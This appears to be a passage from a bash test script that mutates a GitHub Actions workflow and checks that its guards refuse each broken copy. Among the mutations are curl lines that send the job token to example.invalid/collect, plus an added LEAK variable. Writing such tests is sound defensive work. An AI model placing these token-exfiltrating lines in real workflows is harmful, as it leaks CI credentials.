' "stress: the stress run and its check must not be conditional"
breaks next.yml replace '      - name: Check the stress scenarios ran, and none was skipped
' '      - name: Check the stress scenarios ran, and none was skipped
        continue-on-error: true
' "stress: the stress run and its check must not continue on error"

breaks next.yml replace '    timeout-minutes: 10
    # the repository is all it reads
    permissions:
      contents: read
' '    timeout-minutes: 10
    # the repository is all it reads
    permissions:
      contents: write
' "./.github/workflows/next.yml > stress must hold contents: read and nothing else"
breaks next.yml replace '-Dgroups=stress -Dstress.excluded=none -Djacoco.skip=true' '-Dgroups=stress -Djacoco.skip=true' \
  "./.github/workflows/next.yml > stress must run the stress scenarios once"
breaks next.yml replace '"%d stress scenarios were skipped" % skipped' '"%d skipped" % skipped' \
  "./.github/workflows/next.yml > stress must check that the scenarios ran and none was skipped"
breaks next.yml replace '      - name: Check the stress scenarios ran, and none was skipped
' '      - name: Check the stress scenarios ran, and none was skipped
        if: false
' "stress: the stress run and its check must not be conditional"
breaks next.yml replace '      - name: Run the stress scenarios
' '      - name: Run the stress scenarios
        continue-on-error: true
' "stress: the stress run and its check must not continue on error"
breaks next.yml replace '        # the reports and the test output, which holds the seed of the run
        if: always()
' '        # the reports and the test output, which holds the seed of the run
' "./.github/workflows/next.yml > stress must upload its reports whatever the outcome"
breaks next.yml replace "          distribution: 'corretto'
          # No Maven cache and no registry server, as in the 1.0 system tests" "          distribution: 'corretto'
          cache: maven
          # No Maven cache and no registry server, as in the 1.0 system tests" \
  "./.github/workflows/next.yml > stress must restore no cache and name no registry server"
breaks next.yml replace '      - name: Set up JDK 25
        uses: actions/setup-java@cf277c60eb25467037889841efdb72551f06f6c3 # v4
        with:
          java-version: '"'25'"'
          distribution: '"'corretto'"'
          # No Maven cache and no registry server, as in the 1.0 system tests' '      - name: Restore a cache
        uses: actions/cache/restore@v4
        with:
          path: ~/.m2
          key: stress
      - name: Set up JDK 25
        uses: actions/setup-java@cf277c60eb25467037889841efdb72551f06f6c3 # v4
        with:
          java-version: '"'25'"'
          distribution: '"'corretto'"'
          # No Maven cache and no registry server, as in the 1.0 system tests' \
  "./.github/workflows/next.yml > stress must restore no cache: actions/cache/restore@v4"

breaks next.yml replace '    name: Build & Test
' '    name: Build and test
' "next.yml differs from its pinned form"

# The credential guard after each checkout in next.yml, run as it is written and as GitHub runs
# it (bash -e for a step that names no shell; pwsh as GitHub calls it, with its exit code handed
# on), in a scratch repository: it must pass on a clean config and fail on one that kept the job
# token. GitHub's Ubuntu runners have pwsh, so in CI every guard runs; locally a missing pwsh is
# said, not hidden.
guards=$(yq -o=json '[.jobs[].steps[] | select(.name == "Check the checkout left no credentials behind")
  | {"shell": (.shell // "bash"), "run": .run}]' "$root/.github/workflows/next.yml")
count=$(python3 -c 'import json, sys; print(len(json.loads(sys.argv[1])))' "$guards")
if [ "$count" -lt 1 ]; then
  echo "FAIL next.yml has no credential guard to test" >&2
  failures=$((failures + 1))
fi
guard() {  # guard <shell> <file>: runs the guard in the current directory as GitHub would
  case $1 in
    bash) bash -e "$2" ;;
    pwsh) pwsh -NoProfile -NonInteractive -Command "\$ErrorActionPreference = 'Stop'; . '$2'; if ((Test-Path -LiteralPath variable:\LASTEXITCODE)) { exit \$LASTEXITCODE }" ;;
    *) echo "a guard in shell $1 cannot be run here" >&2; return 2 ;;
  esac
}
for i in $(seq 0 $((count - 1))); do
  shell=$(python3 -c 'import json, sys; print(json.loads(sys.argv[1])[int(sys.argv[2])]["shell"])' "$guards" "$i")
  if [ "$shell" = pwsh ] && ! command -v pwsh > /dev/null; then
    if [ -n "${GITHUB_ACTIONS:-}" ]; then
      echo "FAIL credential guard $i is PowerShell and this runner has no pwsh to test it" >&2
      failures=$((failures + 1))
    else
      echo "skip credential guard $i: PowerShell, and no pwsh here (CI runs it)"
    fi
    continue
  fi
  # pwsh runs a script file only as .ps1, so each guard gets the extension its shell needs
  file=$work/guard.sh; [ "$shell" = pwsh ] && file=$work/guard.ps1
  python3 -c 'import json, sys; print(json.loads(sys.argv[1])[int(sys.argv[2])]["run"])' "$guards" "$i" > "$file"
  rm -rf "$work/repo" && git init -q "$work/repo"
  if ! (cd "$work/repo" && guard "$shell" "$file") > /dev/null 2> "$work/err"; then
    echo "FAIL credential guard $i ($shell) refused a clean checkout: $(cat "$work/err")" >&2
    failures=$((failures + 1))
  fi
  git -C "$work/repo" config --local http.https://github.com/.extraheader "AUTHORIZATION: basic x"
  if (cd "$work/repo" && guard "$shell" "$file") > /dev/null 2>&1; then
    echo "FAIL credential guard $i ($shell) accepted a checkout that kept the job token" >&2
    failures=$((failures + 1))
  else
    echo "ok   credential guard $i ($shell) refused a checkout that kept the job token"
  fi
done

breaks next.yml replace '      - name: Check the release checks refuse what they should
' '      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
        with:
          ref: ${{ inputs.commit }}
      - name: Check the release checks refuse what they should
' "./.github/workflows/next.yml > build must check its checkout for credentials in the step right after it"

breaks next.yml replace '      - name: Check the checkout left no credentials behind
        # persist-credentials: false is only a setting until something notices it stopped' '      - name: Check the checkout
        # persist-credentials: false is only a setting until something notices it stopped' \
  "./.github/workflows/next.yml > build must check once that its checkout left no credentials behind"

# next.yml runs for pushes and pull requests to next and to main, whatever the pinned form says
breaks next.yml replace "      - 'next'
      - 'main'
  push:" "      - 'next'
  push:" "./.github/workflows/next.yml > on pull_request must run for next and main"
breaks next.yml replace "  push:
    branches:
      - 'next'
      - 'main'
" "  push:
    branches:
      - 'next'
" "./.github/workflows/next.yml > on push must run for next and main"
breaks next.yml replace "          REF: \${{ github.event.pull_request.head.sha || github.sha }}
" "          REF: \${{ github.sha }}
" "./.github/workflows/next.yml > codeowners must ask about REF"
# the drift workflow's call names the lines as they are called after the rename
breaks schema-drift.yml replace "        run: scripts/schema-drift.sh release/0.x main
" "        run: scripts/schema-drift.sh release/0.x next
" "schema-drift.yml > drift must compare the pins with: scripts/schema-drift.sh release/0.x main"

# next.yml's codeowners job: there, on every run, with only the one script step, which holds the
# job token for its one call
breaks next.yml replace '  codeowners:
' '  codeowners-legacy:
' "./.github/workflows/next.yml must have the job codeowners"
breaks next.yml replace '    name: CODEOWNERS accepted by GitHub
' '    name: CODEOWNERS accepted by GitHub
    if: false
' "./.github/workflows/next.yml > codeowners must not be conditional"
breaks next.yml replace '    name: CODEOWNERS accepted by GitHub
' '    name: CODEOWNERS accepted by GitHub
    continue-on-error: true
' "./.github/workflows/next.yml > codeowners must not continue on error"
breaks next.yml replace '    timeout-minutes: 5
    permissions:
      contents: read
' '    timeout-minutes: 5
    permissions:
      contents: read
      pull-requests: read
' "./.github/workflows/next.yml > codeowners must hold contents: read and nothing else"
breaks next.yml replace '      - name: Ask GitHub for the errors in CODEOWNERS
' '      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
      - name: Ask GitHub for the errors in CODEOWNERS
' "./.github/workflows/next.yml > codeowners must be one script step that asks GitHub for the CODEOWNERS errors"
breaks next.yml replace '      - name: Ask GitHub for the errors in CODEOWNERS
' '      - name: Ask GitHub for the errors in CODEOWNERS
        if: false
' "codeowners: the CODEOWNERS check must not be conditional"
breaks next.yml replace '          REPOSITORY: ${{ github.repository }}
' '          REPOSITORY: ${{ github.repository }}
          LEAK: ${{ github.token }}
' "./.github/workflows/next.yml > codeowners must hand the job token to GH_TOKEN only: github.token"
breaks next.yml replace '          GH_TOKEN: ${{ github.token }}
          REPOSITORY' '          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPOSITORY' "./.github/workflows/next.yml > codeowners must call GitHub with GH_TOKEN: \${{ github.token }}"

breaks next.yml replace '        run: ./scripts/release-codeowners-test.sh
' '        run: ./scripts/release-codeowners-test.sh --none
' "./.github/workflows/next.yml > build must run ./scripts/release-codeowners-test.sh, once"
breaks next.yml replace '      - name: Check CODEOWNERS makes the release managers own what the release build runs
' '      - name: Check CODEOWNERS makes the release managers own what the release build runs
        continue-on-error: true
' "build: the CODEOWNERS ownership test must not continue on error"

breaks next.yml replace '          echo "GitHub reads every line of CODEOWNERS"
' '          echo "GitHub reads every line of CODEOWNERS"
          curl -s -H "Authorization: Bearer $GH_TOKEN" https://example.invalid/collect
' "./.github/workflows/next.yml > codeowners must run exactly the script this test holds"
breaks next.yml replace '          response=$(gh api "repos/$REPOSITORY/codeowners/errors?ref=$REF")
' '          curl -s -d "$GH_TOKEN" https://example.invalid/collect
          response=$(gh api "repos/$REPOSITORY/codeowners/errors?ref=$REF")
' "./.github/workflows/next.yml > codeowners must run exactly the script this test holds"

# That job's script, run as it is written (bash -e, GitHub's shell for a step that names none)
# against a gh that gives the answers GitHub gives: no errors, errors, no list, and a failed call.
ask_run=$(yq '.jobs.codeowners.steps[0].run' "$root/.github/workflows/next.yml")
printf '%s\n' "$ask_run" > "$work/codeowners.sh"
mkdir -p "$work/ask-bin"
cat > "$work/ask-bin/gh" <<'STUB'
#!/usr/bin/env bash
echo "$*" > "$GH_ARGS"
if [ -n "${GH_FAIL:-}" ]; then
  echo "gh: HTTP 502" >&2
  exit 1
fi
printf '%s' "$GH_ANSWER"
STUB
chmod +x "$work/ask-bin/gh"
ask() {  # ask <expect: pass|fail> <what> <gh's answer> [<what a refusal must print>] [failing call: 1]
  local expect=$1 what=$2 answer=$3 says=${4:-} got=pass
  PATH=$work/ask-bin:$PATH GH_ARGS=$work/ask-args GH_ANSWER=$answer GH_FAIL=${5:-} \
    REPOSITORY=oddin-gg/javasdk REF=0123abc bash -e "$work/codeowners.sh" > "$work/ask-out" 2> "$work/ask-err" || got=fail
  if [ "$got" != "$expect" ]; then
    echo "FAIL the CODEOWNERS check ($what): expected $expect, got $got: $(cat "$work/ask-out" "$work/ask-err")" >&2
    failures=$((failures + 1))
  elif [ "$expect" = fail ] && [ -n "$says" ] && ! grep -qF -- "$says" "$work/ask-err"; then
    echo "FAIL the CODEOWNERS check ($what) failed, but did not say \"$says\": $(cat "$work/ask-err")" >&2
    failures=$((failures + 1))
  elif [ "$(cat "$work/ask-args")" != "api repos/oddin-gg/javasdk/codeowners/errors?ref=0123abc" ]; then
    echo "FAIL the CODEOWNERS check ($what) asked GitHub for: $(cat "$work/ask-args")" >&2
    failures=$((failures + 1))
  else
    echo "ok   the CODEOWNERS check ($what) -> $got"
  fi
}
ask pass "no errors" '{"errors":[]}'
ask fail "an owner GitHub does not know" '{"errors":[{"line":13,"column":36,"kind":"Unknown owner","source":"/mvnw @oddin-gg/nobody","suggestion":"Make sure @oddin-gg/nobody exists","message":"Unknown owner on line 13: make sure @oddin-gg/nobody exists and has write access to the repository","path":".github/CODEOWNERS"}]}' \
  ".github/CODEOWNERS:13: Unknown owner: Unknown owner on line 13"
ask fail "a line it cannot parse" '{"errors":[{"line":2,"column":1,"kind":"Invalid pattern","source":"[","suggestion":null,"message":"Invalid pattern on line 2","path":".github/CODEOWNERS"}]}' \
  "GitHub rejects 1 line(s) of CODEOWNERS"
ask fail "an answer without a list" '{}' "holds no list of CODEOWNERS errors"
ask fail "a null list" '{"errors":null}' "holds no list of CODEOWNERS errors"
ask fail "an answer that is no JSON" 'Not Found' "holds no list of CODEOWNERS errors"
ask fail "a call that fails" '' '' 1

# The 1.0 job's check of its reports, run as it is written (with bash -e, GitHub's shell for a step
# that names none),
# against reports it must accept and reports it must refuse.
check_run=$(yq '.jobs["system-tests-next"].steps[] | select(.name == "Check the integration tests ran, against 1.0") | .run' \
  "$root/.github/workflows/next.yml")
check_shell=$(yq '.jobs["system-tests-next"].steps[] | select(.name == "Check the integration tests ran, against 1.0") | .shell // "bash"' \
  "$root/.github/workflows/next.yml")
if [ "$check_shell" != bash ]; then
  echo "FAIL next.yml > system-tests-next's report check runs in $check_shell, which this test does not run" >&2
  failures=$((failures + 1))
fi
if [ -z "$check_run" ]; then
  echo "FAIL next.yml > system-tests-next has no report check to test" >&2
  failures=$((failures + 1))
fi
printf '%s\n' "$check_run" > "$work/reports.sh"
reports() {  # reports <expect: pass|fail> <what> <summary: completed count or "none"> <report: none|ok|skipped|failure|error|missing-case> [<message a refusal must print>]
  local expect=$1 what=$2 completed=$3 report=$4 dir=$work/reports
  rm -rf "$dir" && mkdir -p "$dir/system-tests/target/failsafe-reports"
  local out=$dir/system-tests/target/failsafe-reports
  if [ "$completed" != none ]; then
    printf '<failsafe-summary>\n    <completed>%s</completed>\n    <skipped>1</skipped>\n</failsafe-summary>\n' "$completed" \
      > "$out/failsafe-summary.xml"
  fi
  local inner=
  case $report in
    skipped|failure|error) inner="<$report message=\"x\"/>" ;;
  esac
  case $report in
    none) ;;
    missing-case) printf '<testsuite><testcase name="anotherTest"/></testsuite>\n' \
      > "$out/TEST-com.oddin.oddsfeed.systemtests.BuildWiringIT.xml" ;;
    *) printf '<testsuite><testcase name="theSdkIsTheOneThisReactorBuilt">%s</testcase></testsuite>\n' "$inner" \
      > "$out/TEST-com.oddin.oddsfeed.systemtests.BuildWiringIT.xml" ;;
  esac
  if (cd "$dir" && bash -e "$work/reports.sh") > /dev/null 2> "$work/reports.err"; then got=pass; else got=fail; fi
  if [ "$got" = fail ] && [ -n "${5:-}" ] && ! grep -qF -- "$5" "$work/reports.err"; then
    got="fail for another reason: $(head -c 200 "$work/reports.err")"
  fi
  if [ "$got" = "$expect" ]; then
    echo "ok   the 1.0 report check: $what -> $got"
  else
    echo "FAIL the 1.0 report check: $what -> $got, should $expect" >&2
    failures=$((failures + 1))
  fi
}
reports pass "the version test ran" 67 ok
reports fail "the version test skipped" 67 skipped "check the 1.0 SDK's version: skipped"
reports fail "the version test failed" 67 failure "check the 1.0 SDK's version: failure"
reports fail "the version test errored" 67 error "check the 1.0 SDK's version: error"
reports fail "no version test in the report" 67 missing-case "no such test in the report"
reports fail "no BuildWiringIT report" 67 none "TEST-com.oddin.oddsfeed.systemtests.BuildWiringIT.xml"
reports fail "no failsafe summary" none ok "no failsafe summary"
reports fail "zero integration tests" 0 ok "failsafe ran zero integration tests"

if [ "$failures" -ne 0 ]; then
  echo "$failures broken copies were not refused as they should be" >&2
  exit 1
fi
echo "every broken copy was refused for its rule"
